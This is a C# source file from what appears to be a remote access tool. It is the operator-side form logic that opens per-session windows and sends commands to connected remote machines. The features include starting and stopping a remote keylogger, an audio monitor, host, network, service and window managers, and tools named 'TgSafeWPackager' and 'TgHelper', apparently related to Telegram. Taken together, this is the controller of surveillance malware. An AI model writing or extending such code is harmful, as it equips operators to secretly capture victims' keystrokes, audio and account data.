using System;
using System.Collections.Generic;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Server
{
    public partial class FrmMain
    {
        private Dictionary<string, FrmServiceManager> sessionSvcMgrForms = new Dictionary<string, FrmServiceManager>();
        private Dictionary<string, FrmKeylogger> sessionKeyloggerForms = new Dictionary<string, FrmKeylogger>();
        private Dictionary<string, FrmNetworkInfo> sessionNetworkInfoForms = new Dictionary<string, FrmNetworkInfo>();
        private Dictionary<string, FrmWindowManager> sessionWindowMgrForms = new Dictionary<string, FrmWindowManager>();
        private Dictionary<string, FrmHostInfo> sessionHostInfoForms = new Dictionary<string, FrmHostInfo>();
        private Dictionary<string, FrmAudioMonitor> sessionAudioMonitorForms = new Dictionary<string, FrmAudioMonitor>();
        private Dictionary<string, FrmTgSafeWPackager> sessionTgPackagerForms = new Dictionary<string, FrmTgSafeWPackager>();

        private void onMenuKeyloggerStart(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenKeyloggerForm();
        }

        private void onMenuKeyloggerStop(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            string sid = currentSession.SocketId;
            if (sessionKeyloggerForms.ContainsKey(sid))
            {
                var frm = sessionKeyloggerForms[sid];
                if (!frm.IsDisposed) frm.Close();
                sessionKeyloggerForms.Remove(sid);
            }
            currentSession.Send(ePacketType.PACKET_KEYLOGGER_STOP_REQUEST, new RequestKeylogger { Action = eKeyloggerAction.Stop });
        }

        private void onMenuServiceManager(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenServiceManagerForm();
        }

        private void onMenuNetworkInfo(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenNetworkInfoForm();
        }

        private void onMenuWindowManager(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenWindowManagerForm();
        }

        private void onMenuHostInfo(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            OpenHostInfoForm();
        }

        private void onMenuTgSafeWPackager(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            string sid = currentSession.SocketId;
            FrmTgSafeWPackager frm;
            if (sessionTgPackagerForms.ContainsKey(sid) && !sessionTgPackagerForms[sid].IsDisposed)
            {
                frm = sessionTgPackagerForms[sid];
                if (frm.WindowState == FormWindowState.Minimized) frm.WindowState = FormWindowState.Normal;
                frm.Activate();
            }
            else
            {
                frm = new FrmTgSafeWPackager(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
                sessionTgPackagerForms[sid] = frm;
                frm.FormClosed += (s, e2) => sessionTgPackagerForms.Remove(sid);
                frm.Show();
            }
        }

        private void onMenuTgHelper(object sender, EventArgs e)
        {
            if (currentSession == null) return;
            var frm = new FrmTgHelper(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
            frm.Show();
        }

        private void OpenKeyloggerForm()
        {
            string sid = currentSession.SocketId;
            FrmKeylogger frm;
            if (sessionKeyloggerForms.ContainsKey(sid) && !sessionKeyloggerForms[sid].IsDisposed)
            {
                frm = sessionKeyloggerForms[sid];
                if (frm.WindowState == FormWindowState.Minimized) frm.WindowState = FormWindowState.Normal;
                frm.Activate();
            }
            else
            {
                frm = new FrmKeylogger(currentSession, currentSession.HostName, currentSession.SocketId.GetHashCode());
                sessionKeyloggerForms[sid] = frm;
                frm.FormClosed += (s, e2) => sessionKeyloggerForms.Remove(sid);
                frm.Show();
            }
            currentSession.Send(ePacketType.PACKET_KEYLOGGER_START_REQUEST, new RequestKeylogger { Action = eKeyloggerAction.Start });
        }

        private void OpenServiceManagerForm()
        {
            string sid = currentSession.SocketId;
            FrmServiceManager frm;
            if (sessionSvcMgrForms.ContainsKey(sid) && !sessionSvcMgrForms[sid].IsDisposed)
            {
                frm = sessionSvcMgrForms[sid];
                if (frm.WindowState == FormWindowState.Minimized) frm.WindowState = FormWindowState.Normal;
                frm.Activate();
            }
            else
            {
                frm = new FrmServiceManager(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
                sessionSvcMgrForms[sid] = frm;
                frm.FormClosed += (s, e2) => sessionSvcMgrForms.Remove(sid);
                frm.Show();
            }
        }

        private void OpenNetworkInfoForm()
        {
            string sid = currentSession.SocketId;
            FrmNetworkInfo frm;
            if (sessionNetworkInfoForms.ContainsKey(sid) && !sessionNetworkInfoForms[sid].IsDisposed)
            {
                frm = sessionNetworkInfoForms[sid];
                if (frm.WindowState == FormWindowState.Minimized) frm.WindowState = FormWindowState.Normal;
                frm.Activate();
            }
            else
            {
                frm = new FrmNetworkInfo(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
                sessionNetworkInfoForms[sid] = frm;
                frm.FormClosed += (s, e2) => sessionNetworkInfoForms.Remove(sid);
                frm.Show();
            }
        }

        private void OpenWindowManagerForm()
        {
            string sid = currentSession.SocketId;
            FrmWindowManager frm;
            if (sessionWindowMgrForms.ContainsKey(sid) && !sessionWindowMgrForms[sid].IsDisposed)
            {
                frm = sessionWindowMgrForms[sid];
                if (frm.WindowState == FormWindowState.Minimized) frm.WindowState = FormWindowState.Normal;
                frm.Activate();
            }
            else
            {
                frm = new FrmWindowManager(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
                sessionWindowMgrForms[sid] = frm;
                frm.FormClosed += (s, e2) => sessionWindowMgrForms.Remove(sid);
                frm.Show();
            }
        }

        private void OpenHostInfoForm()
        {
            string sid = currentSession.SocketId;
            FrmHostInfo frm;
            if (sessionHostInfoForms.ContainsKey(sid) && !sessionHostInfoForms[sid].IsDisposed)
            {
                frm = sessionHostInfoForms[sid];
                if (frm.WindowState == FormWindowState.Minimized) frm.WindowState = FormWindowState.Normal;
                frm.Activate();
            }
            else
            {
                frm = new FrmHostInfo(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
                sessionHostInfoForms[sid] = frm;
                frm.FormClosed += (s, e2) => sessionHostInfoForms.Remove(sid);
                frm.Show();
            }
        }

        private void OpenAudioMonitorForm()
        {
            string sid = currentSession.SocketId;
            FrmAudioMonitor frm;
            if (sessionAudioMonitorForms.ContainsKey(sid) && !sessionAudioMonitorForms[sid].IsDisposed)
            {
                frm = sessionAudioMonitorForms[sid];
                if (frm.WindowState == FormWindowState.Minimized) frm.WindowState = FormWindowState.Normal;
                frm.Activate();
            }
            else
            {
                frm = new FrmAudioMonitor(currentSession, currentSession.HostName ?? currentSession.GetExternalIP());
                sessionAudioMonitorForms[sid] = frm;
                frm.FormClosed += (s, e2) => sessionAudioMonitorForms.Remove(sid);
                frm.Show();
            }
        }
    }
}
